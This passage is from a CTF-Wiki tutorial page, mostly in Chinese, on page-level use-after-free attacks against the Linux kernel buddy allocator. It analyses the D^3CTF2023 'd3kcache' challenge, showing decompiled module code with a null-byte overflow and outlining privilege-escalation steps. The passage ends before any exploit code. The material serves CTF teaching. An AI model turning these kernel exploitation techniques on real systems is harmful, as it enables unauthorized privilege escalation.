href=../../../../../../browser/chrome/js-engine/v8/ class=md-nav__link> V8 Engine Intro </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/ignition/ class=md-nav__link> Ignition Interpreter </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/turbofan/ class=md-nav__link> TurboFan JIT Compiler </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/history/ class=md-nav__link> V8 Design History </a> </li> <li class=md-nav__item> <a href=../../../../../../browser/chrome/js-engine/mutable-heap-numbers/ class=md-nav__link> Mutable Heap Numbers </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-2 type=checkbox id=nav-9-7-2> <label class=md-nav__link for=nav-9-7-2> Firefox <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Firefox data-md-level=3> <label class=md-nav__title for=nav-9-7-2> <span class="md-nav__icon md-icon"></span> Firefox </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../browser/firefox/readme/ class=md-nav__link> Firefox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-3 type=checkbox id=nav-9-7-3> <label class=md-nav__link for=nav-9-7-3> Safari <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Safari data-md-level=3> <label class=md-nav__title for=nav-9-7-3> <span class="md-nav__icon md-icon"></span> Safari </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../browser/safari/readme/ class=md-nav__link> Safari </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8 type=checkbox id=nav-9-8> <label class=md-nav__link for=nav-9-8> Hardware <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Hardware data-md-level=2> <label class=md-nav__title for=nav-9-8> <span class="md-nav__icon md-icon"></span> Hardware </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1 type=checkbox id=nav-9-8-1> <label class=md-nav__link for=nav-9-8-1> CPU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CPU data-md-level=3> <label class=md-nav__title for=nav-9-8-1> <span class="md-nav__icon md-icon"></span> CPU </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../hardware/cpu/readme/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1-2 type=checkbox id=nav-9-8-1-2> <label class=md-nav__link for=nav-9-8-1-2> 侧信道攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=侧信道攻击 data-md-level=4> <label class=md-nav__title for=nav-9-8-1-2> <span class="md-nav__icon md-icon"></span> 侧信道攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../hardware/cpu/side-channel/prefetch/ class=md-nav__link> prefetch side-channel attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-2 type=checkbox id=nav-9-8-2> <label class=md-nav__link for=nav-9-8-2> 可信计算 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=可信计算 data-md-level=3> <label class=md-nav__title for=nav-9-8-2> <span class="md-nav__icon md-icon"></span> 可信计算 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../hardware/trusted-computing/tee/ class=md-nav__link> 可信执行环境 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10 type=checkbox id=nav-10> <label class=md-nav__link for=nav-10> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=nav-10> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_develop/basic_develop/ class=md-nav__link> Android 开发基础 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2 type=checkbox id=nav-10-2> <label class=md-nav__link for=nav-10-2> Android 运行机制简述 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 运行机制简述" data-md-level=2> <label class=md-nav__title for=nav-10-2> <span class="md-nav__icon md-icon"></span> Android 运行机制简述 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/readme/ class=md-nav__link> Android 应用运行机制简述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2 type=checkbox id=nav-10-2-2> <label class=md-nav__link for=nav-10-2-2> Android 中 Java 层的运行机制 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 中 Java 层的运行机制" data-md-level=3> <label class=md-nav__title for=nav-10-2-2> <span class="md-nav__icon md-icon"></span> Android 中 Java 层的运行机制 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/readme/ class=md-nav__link> Android 中 Java 层的运行机制 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/smali/smali/ class=md-nav__link> Smali </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2-3 type=checkbox id=nav-10-2-2-3> <label class=md-nav__link for=nav-10-2-2-3> Dex && ODEX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Dex && ODEX" data-md-level=4> <label class=md-nav__title for=nav-10-2-2-3> <span class="md-nav__icon md-icon"></span> Dex && ODEX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/dex/dex/ class=md-nav__link> DEX文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/java_layer/dex/odex/ class=md-nav__link> ODEX文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-3 type=checkbox id=nav-10-2-3> <label class=md-nav__link for=nav-10-2-3> Android Native 层介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android Native 层介绍" data-md-level=3> <label class=md-nav__title for=nav-10-2-3> <span class="md-nav__icon md-icon"></span> Android Native 层介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_operating_mechanism/native_layer/so/ class=md-nav__link> so 介绍 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3 type=checkbox id=nav-10-3> <label class=md-nav__link for=nav-10-3> Android 逆向基本介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 逆向基本介绍" data-md-level=2> <label class=md-nav__title for=nav-10-3> <span class="md-nav__icon md-icon"></span> Android 逆向基本介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/overview/ class=md-nav__link> Android 逆向基本介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/android_code_location/ class=md-nav__link> Android 关键代码定位 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-3 type=checkbox id=nav-10-3-3> <label class=md-nav__link for=nav-10-3-3> Android 简单静态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 简单静态分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-3> <span class="md-nav__icon md-icon"></span> Android 简单静态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/static/java-example/ class=md-nav__link> 静态分析 java 层例子 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/static/so-example/ class=md-nav__link> 静态分析原生层程序 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/static/complex-example/ class=md-nav__link> 静态分析综合题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-4 type=checkbox id=nav-10-3-4> <label class=md-nav__link for=nav-10-3-4> Android 简单动态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 简单动态分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-4> <span class="md-nav__icon md-icon"></span> Android 简单动态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/dynamic/dynamic_debug/ class=md-nav__link> Android 动态调试 </a> </li> <li class=md-nav__item> <a href=../../../../../../../android/basic_reverse/dynamic/ida_native_debug/ class=md-nav__link> IDA 动态调试原生层程序 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-11 type=checkbox id=nav-11> <label class=md-nav__link for=nav-11> ICS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ICS data-md-level=1> <label class=md-nav__title for=nav-11> <span class="md-nav__icon md-icon"></span> ICS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../ics/ctfs/ class=md-nav__link> ICS_CTF 竞赛 </a> </li> <li class=md-nav__item> <a href=../../../../../../../ics/discover/ class=md-nav__link> ICS_CTF 发现 </a> </li> <li class=md-nav__item> <a href=../../../../../../../ics/exploit/ class=md-nav__link> ICS_CTF 利用 </a> </li> <li class=md-nav__item> <a href=../../../../../../../ics/learn/ class=md-nav__link> ICS_CTF 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12 type=checkbox id=nav-12> <label class=md-nav__link for=nav-12> Blockchain <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Blockchain data-md-level=1> <label class=md-nav__title for=nav-12> <span class="md-nav__icon md-icon"></span> Blockchain </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/introduction/ class=md-nav__link> Blockchain Security Overview </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2 type=checkbox id=nav-12-2> <label class=md-nav__link for=nav-12-2> Ethereum Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Ethereum Security" data-md-level=2> <label class=md-nav__title for=nav-12-2> <span class="md-nav__icon md-icon"></span> Ethereum Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/introduction/ class=md-nav__link> Ethereum Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/basics/ class=md-nav__link> Ethereum Basics </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/selector-encoding/ class=md-nav__link> Function Selector and Argument Encoding </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/storage/ class=md-nav__link> Ethereum Storage </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/opcodes/ class=md-nav__link> Ethereum Opcodes </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2-6 type=checkbox id=nav-12-2-6> <label class=md-nav__link for=nav-12-2-6> Known Attacks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Known Attacks" data-md-level=3> <label class=md-nav__title for=nav-12-2-6> <span class="md-nav__icon md-icon"></span> Known Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/re-entrancy/ class=md-nav__link> Re-Entrancy </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/overflow-underflow/ class=md-nav__link> Integer Overflow and Underflow </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/randomness/ class=md-nav__link> Randomness </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/airdrop-hunting/ class=md-nav__link> Airdrop Hunting </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/shortaddress/ class=md-nav__link> Short Address Attack </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/delegatecall/ class=md-nav__link> Delegatecall </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/uninitialized-storage-pointer/ class=md-nav__link> Uninitialized Storage Pointer </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/arbitrarywrite/ class=md-nav__link> Arbitrary Writing </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/create2/ class=md-nav__link> CREATE2 </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/attacks/jump-oriented-programming/ class=md-nav__link> Jump Oriented Programming </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/reverse/ class=md-nav__link> Smart Contract Reverse </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/ethereum/resources/ class=md-nav__link> 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-3 type=checkbox id=nav-12-3> <label class=md-nav__link for=nav-12-3> Public Blockchain Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Public Blockchain Security" data-md-level=2> <label class=md-nav__title for=nav-12-3> <span class="md-nav__icon md-icon"></span> Public Blockchain Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../blockchain/publicblockchain/introduction/ class=md-nav__link> Public Blockchain Security Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/publicblockchain/weaknesses/ class=md-nav__link> Blockchain Weaknesses </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../blockchain/challenges/ class=md-nav__link> Blockchain Security Challenges </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#d3ctf2023-d3kcache class=md-nav__link> 例题：D^3CTF2023 - d3kcache </a> <nav class=md-nav aria-label="例题：D^3CTF2023 - d3kcache"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 题目分析 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 漏洞利用 </a> <nav class=md-nav aria-label=漏洞利用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#stepi- class=md-nav__link> Step.I - 页级堆风水构造稳定跨页溢出布局 </a> </li> <li class=md-nav__item> <a href=#stepii-fcntlf_setpipe_sz-pipe_buffer-slub-uaf class=md-nav__link> Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF </a> </li> <li class=md-nav__item> <a href=#stepiii- class=md-nav__link> Step.III - 构造二级自写管道，实现任意内存读写 </a> </li> <li class=md-nav__item> <a href=#stepiv- class=md-nav__link> Step.IV - 提权 </a> <nav class=md-nav aria-label="Step.IV - 提权"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#task_struct-cred-init_cred class=md-nav__link> 方法一、修改当前进程的 task_struct 的 cred 为 init_cred </a> </li> <li class=md-nav__item> <a href=#rop class=md-nav__link> 方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP </a> </li> <li class=md-nav__item> <a href=#usma class=md-nav__link> 方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#final-exploitation class=md-nav__link> Final Exploitation </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#reference class=md-nav__link> REFERENCE </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <a href=https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/pwn/linux/kernel-mode/exploitation/heap/buddy/page-uaf.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=page-level-uaf>Page-level UAF<a class=headerlink href=#page-level-uaf title="Permanent link">&para;</a></h1> <div class="admonition warning"> <p class=admonition-title>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through Google Translate.</p> <p>Besides, you can also help to translate it: <a href=https://ctf-wiki.org/en/contribute/before-contributing/ >Contributing</a>.</p> </div> <p><strong>Page-level UAF</strong> 同样是<strong>针对 buddy system</strong> 的利用手法，这种攻击手法主要指的是对内存页结构体 <code>page</code> 的释放后利用，例如：</p> <ul> <li>我们可以通过内存页重分配的方式将 UAF page 分配为指定 <code>kmem_cache</code> 的 <code>slub pages</code> ，<strong>从而实现无需任何限制的跨</strong> <code>kmem_cache</code> <strong>的 UAF 利用</strong>。</li> <li>我们可以通过内存页重分配的方式将 UAF page 分配为指定进程的页表，从而实现 <strong>任意内存映射攻击</strong>。</li> <li>我们可以通过 slab objects 的全部释放导致的 slab free 后对实现 page 上数据的 UAF，从而 <strong>将对内核对象的 UAF 读写转换为对 page 的 UAF 读写</strong> 。</li> <li>......</li> </ul> <p>作为近几年新出现的利用手法，page-level UAF 还有更多值得我们去探索的地方。</p> <blockquote> <p>注：我们不使用 <a href=https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf>某“团伙”重新命名的 “PageJack”</a> 这个叫法，仅 CTF-Wiki 页面的发布时间便至少早于 BlackHat 2024 USA 一年多（更早时候便应当在一些小圈子里已有传播）。对一个至少一年多前就公开的旧事物，在一年多后承认并使用来自非原创作者的命名无疑是荒谬的。</p> </blockquote> <h2 id=d3ctf2023-d3kcache>例题：D^3CTF2023 - d3kcache<a class=headerlink href=#d3ctf2023-d3kcache title="Permanent link">&para;</a></h2> <blockquote> <p>题目原附件可在<a href=https://github.com/arttnba3/D3CTF2023_d3kcache>https://github.com/arttnba3/D3CTF2023_d3kcache</a>下载。</p> </blockquote> <h3 id=_1>题目分析<a class=headerlink href=#_1 title="Permanent link">&para;</a></h3> <p>题目逆向起来应该还是比较简单的，在模块初始化函数中创建了一个独立的 <code>kmem_cache</code> ，对象大小为 2048：</p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=nf>sub_529</span><span class=p>()</span>
<span class=p>{</span>
<span class=w>  </span><span class=n>printk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_96B</span><span class=p>);</span>
<span class=w>  </span><span class=n>major_num</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_register_chrdev</span><span class=p>(</span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>256L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;d3kcache&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>d3kcache_fo</span><span class=p>);</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>major_num</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>module_class</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_class_create</span><span class=p>(</span><span class=o>&amp;</span><span class=n>_this_module</span><span class=p>,</span><span class=w> </span><span class=s>&quot;d3kcache&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>d3kcache_module_init___key</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=p>)</span><span class=n>module_class</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mh>0xFFFFFFFFFFFFF001LL</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>printk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_A0D</span><span class=p>);</span>
<span class=w>      </span><span class=n>module_device</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>device_create</span><span class=p>(</span><span class=n>module_class</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)(</span><span class=n>major_num</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>20</span><span class=p>),</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;d3kcache&quot;</span><span class=p>);</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=p>)</span><span class=n>module_device</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mh>0xFFFFFFFFFFFFF001LL</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>printk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_A66</span><span class=p>);</span>
<span class=w>        </span><span class=n>spin</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>        </span><span class=n>kcache_jar</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>kmem_cache_create_usercopy</span><span class=p>(</span><span class=s>&quot;kcache_jar&quot;</span><span class=p>,</span><span class=w> </span><span class=mf>2048L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>67379200L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>2048L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>);</span>
<span class=w>        </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>kcache_list</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mh>0x100uLL</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=k>else</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>class_destroy</span><span class=p>(</span><span class=n>module_class</span><span class=p>);</span>
<span class=w>        </span><span class=n>_unregister_chrdev</span><span class=p>((</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>major_num</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>256L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;d3kcache&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=n>printk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_A3B</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=k>else</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>_unregister_chrdev</span><span class=p>((</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>major_num</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>256L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;d3kcache&quot;</span><span class=p>);</span>
<span class=w>      </span><span class=n>printk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_9DE</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=k>else</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>printk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_9AD</span><span class=p>);</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>_x86_return_thunk</span><span class=p>(</span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div> <p>自定义的 ioctl 函数提供了分配、追加编辑、释放、读取的一个堆菜单，漏洞便出在追加编辑当中，当写满 2048 字节时存在着一个 <code>\0</code> 字节的溢出：</p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=kr>__fastcall</span><span class=w> </span><span class=n>sub_99</span><span class=p>(</span><span class=kr>__int64</span><span class=w> </span><span class=n>a1</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>a2</span><span class=p>,</span><span class=w> </span><span class=kr>__int64</span><span class=w> </span><span class=n>a3</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// r8</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v5</span><span class=p>;</span><span class=w> </span><span class=c1>// r9</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v7</span><span class=p>;</span><span class=w> </span><span class=c1>// ecx</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v8</span><span class=p>;</span><span class=w> </span><span class=c1>// r14</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v9</span><span class=p>;</span><span class=w> </span><span class=c1>// r15</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v10</span><span class=p>;</span><span class=w> </span><span class=c1>// r12</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v11</span><span class=p>;</span><span class=w> </span><span class=c1>// ecx</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v12</span><span class=p>;</span><span class=w> </span><span class=c1>// rbx</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v13</span><span class=p>;</span><span class=w> </span><span class=c1>// r14</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v14</span><span class=p>;</span><span class=w> </span><span class=c1>// r15</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v15</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v16</span><span class=p>;</span><span class=w> </span><span class=c1>// r15</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v17</span><span class=p>;</span><span class=w> </span><span class=c1>// er13</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v18</span><span class=p>;</span><span class=w> </span><span class=c1>// r14</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v19</span><span class=p>;</span><span class=w> </span><span class=c1>// r12</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v20</span><span class=p>;</span><span class=w> </span><span class=c1>// r14</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=w> </span><span class=n>v21</span><span class=p>;</span><span class=w> </span><span class=c1>// rbx</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v22</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v23</span><span class=p>;</span><span class=w> </span><span class=c1>// r12</span>
